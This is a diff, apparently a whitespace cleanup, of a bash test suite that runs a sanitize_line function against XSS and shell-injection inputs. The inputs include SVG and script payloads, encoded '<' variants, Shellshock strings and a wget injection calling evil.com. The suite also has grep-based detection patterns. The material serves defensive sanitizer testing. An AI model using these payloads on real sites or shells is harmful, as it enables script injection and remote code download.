@@ -74,35 +74,35 @@ test_info() {
 assert_safe_html() {
   local test_name="$1"
   local output="$2"
-  
+
   # Check for unescaped < followed by tag names
   if echo "$output" | grep -q '<script' || echo "$output" | grep -q '</script'; then
     test_failed "$test_name" "Contains unescaped <script> tag"
     return 1
   fi
-  
+
   if echo "$output" | grep -q '<img '; then
     test_failed "$test_name" "Contains unescaped <img> tag"
     return 1
   fi
-  
+
   if echo "$output" | grep -q '<svg '; then
     test_failed "$test_name" "Contains unescaped <svg> tag"
     return 1
   fi
-  
+
   # Check for javascript: protocol in an actual href attribute (unescaped)
   if echo "$output" | grep -Eq '<[^>]*href=['\''"]?javascript:'; then
     test_failed "$test_name" "Contains unescaped javascript: in href"
     return 1
   fi
-  
+
   # Check for unescaped event handlers in actual tag attributes
   if echo "$output" | grep -Eq '<[^>]*on[a-z]+=['\''"]?[a-zA-Z(]'; then
     test_failed "$test_name" "Contains unescaped event handler in tag"
     return 1
   fi
-  
+
   test_passed "$test_name"
   return 0
 }
@@ -111,20 +111,20 @@ assert_safe_html() {
 assert_lt_escaped() {
   local test_name="$1"
   local output="$2"
-  
+
   # After sanitization, any form of < should be escaped
   # We check that there are no literal < characters at the start
   if echo "$output" | grep -q '^<'; then
     test_failed "$test_name" "Contains unescaped < character"
     return 1
   fi
-  
+
   # Should contain &lt; or &#
   if echo "$output" | grep -qE '(&lt;|&#)'; then
     test_passed "$test_name"
     return 0
   fi
-  
+
   # If input was just the encoding, output might be the encoding itself (safe)
   test_passed "$test_name"
   return 0
@@ -144,32 +144,32 @@ SVG_DIR="${SCRIPT_DIR}/../../Commodity-Injection-Signatures/svg"
 
 if [[ -d "$SVG_DIR" ]]; then
   test_info "Testing SVG XSS vectors from $SVG_DIR"
-  
+
   # Test 1: SVG with onload handler
   input='<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>'
   output=$(sanitize_line "$input")
   assert_safe_html "SVG Test 1: SVG onload handler" "$output"
-  
+
   # Test 2: SVG with script inside
   input='<svg><script>alert(1)</script></svg>'
   output=$(sanitize_line "$input")
   assert_safe_html "SVG Test 2: SVG with script" "$output"
-  
+
   # Test 3: SVG with animate
   input='<svg><animate onbegin=alert(1) attributeName=x dur=1s>'
   output=$(sanitize_line "$input")
   assert_safe_html "SVG Test 3: SVG animate onbegin" "$output"
-  
+
   # Test 4: SVG with foreignObject
   input='<svg><foreignObject><script>alert(1)</script></foreignObject></svg>'
   output=$(sanitize_line "$input")
   assert_safe_html "SVG Test 4: SVG foreignObject script" "$output"
-  
+
   # Test 5: SVG with use and xlink
   input='<svg><use xlink:href="data:image/svg+xml;base64,PHN2ZyBpZD0icmVjdGFuZ2xlIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4=" /></svg>'
   output=$(sanitize_line "$input")
   assert_safe_html "SVG Test 5: SVG use xlink" "$output"
-  
+
   # Test SVG files if they exist
   svg_test_count=0
   if [[ -f "$SVG_DIR/xss-xml-svg-event-example-poc.txt" ]]; then
@@ -180,18 +180,18 @@ if [[ -d "$SVG_DIR" ]]; then
       assert_safe_html "SVG File Test #$svg_test_count" "$output"
     done < "$SVG_DIR/xss-xml-svg-event-example-poc.txt"
   fi
-  
+
   # Test actual SVG files
   for svg_file in "$SVG_DIR"/*.svg; do
     [[ -f "$svg_file" ]] || continue
     basename_file=$(basename "$svg_file")
-    
+
     # Read first few lines of SVG file
     content=$(head -5 "$svg_file" | tr '\n' ' ')
     output=$(sanitize_line "$content")
     assert_safe_html "SVG File: $basename_file" "$output"
   done
-  
+
 else
   test_info "SVG directory not found at $SVG_DIR - skipping SVG tests"
 fi
@@ -210,45 +210,45 @@ ENCODING_FILE="${SCRIPT_DIR}/../../Commodity-Injection-Signatures/random/all-enc
 
 if [[ -f "$ENCODING_FILE" ]]; then
   test_info "Testing various encodings of '<' character"
-  
+
   # Test basic encodings manually first
   echo "Testing common < encodings..."
-  
+
   # Test 1: URL encoding
   input='%3C'
   output=$(sanitize_line "$input")
   assert_lt_escaped "Encoding Test 1: URL encoded <" "$output"
-  
+
   # Test 2: HTML entity (decimal)
   input='&#60;'
   output=$(sanitize_line "$input")
   assert_lt_escaped "Encoding Test 2: HTML decimal entity" "$output"
-  
+
   # Test 3: HTML entity (hex)
   input='&#x3c;'
   output=$(sanitize_line "$input")
   assert_lt_escaped "Encoding Test 3: HTML hex entity" "$output"
-  
+
   # Test 4: Named entity
   input='&lt;'
   output=$(sanitize_line "$input")
   assert_lt_escaped "Encoding Test 4: Named entity" "$output"
-  
+
   # Test all encodings from file
   encoding_count=0
   while IFS= read -r line && [[ $encoding_count -lt 100 ]]; do
     ((encoding_count++))
     [[ -z "$line" ]] && continue
-    
+
     # Combine with script tag to make it dangerous
     dangerous_input="${line}script>alert(1)<${line}/script>"
     output=$(sanitize_line "$dangerous_input")
     assert_safe_html "Encoding File Test #$encoding_count" "$output"
-    
+
   done < "$ENCODING_FILE"
-  
+
   test_info "Tested $encoding_count encoding variations"
-  
+
 else
   test_info "Encoding file not found at $ENCODING_FILE - skipping encoding tests"
 fi
@@ -267,7 +267,7 @@ BASH_FILE="${SCRIPT_DIR}/../../Commodity-Injection-Signatures/unix/bash-bug-inje
 
 if [[ -f "$BASH_FILE" ]]; then
   test_info "Testing Bash injection signatures (Shellshock, etc.)"
-  
+
   # Test 1: Shellshock basic
   input='() { :;}; echo vulnerable'
   output=$(sanitize_line "$input")
@@ -277,32 +277,32 @@ if [[ -f "$BASH_FILE" ]]; then
   else
     test_failed "Bash Test 1: Shellshock basic" "May contain shell syntax"
   fi
-  
+
   # Test 2: Environment variable exploit
   input="env x='() { :;}; echo vulnerable' bash -c 'test'"
   output=$(sanitize_line "$input")
   assert_safe_html "Bash Test 2: Environment exploit" "$output"
-  
+
   # Test 3: Wget command injection
   input='() { :;}; /bin/bash -c "wget http://evil.com/script"'
   output=$(sanitize_line "$input")
   assert_safe_html "Bash Test 3: Wget injection" "$output"
-  
+
   # Test all bash signatures from file
   bash_test_count=0
   while IFS= read -r line; do
     ((bash_test_count++))
     [[ -z "$line" ]] && continue
-    
+
     output=$(sanitize_line "$line")
     # These should be escaped/neutralized
     # Check that dangerous shell metacharacters are escaped or removed
     assert_safe_html "Bash Signature #$bash_test_count" "$output"
-    
+
   done < "$BASH_FILE"
-  
+
   test_info "Tested $bash_test_count bash injection signatures"
-  
+
 else
   test_info "Bash signatures file not found at $BASH_FILE - skipping shell injection tests"
 fi
